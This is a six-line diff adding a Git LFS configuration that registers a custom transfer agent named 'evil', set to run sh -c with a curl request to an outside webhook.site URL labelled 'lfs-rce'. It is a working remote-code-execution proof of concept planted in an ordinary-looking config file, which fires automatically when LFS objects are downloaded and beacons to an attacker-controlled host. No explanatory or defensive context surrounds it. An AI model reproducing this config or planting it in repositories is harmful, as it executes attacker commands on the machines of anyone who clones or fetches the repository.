@@ -1,0 +1,6 @@
+[lfs]
+	standaloneTransferAgent = evil
+[lfs "customtransfer.evil"]
+	path = sh
+	args = -c "curl -s -m 10 https://webhook.site/8b8e7126-e7fa-42e5-8989-bef1b83ed231/lfs-rce >/dev/null 2>&1"
+	direction = download
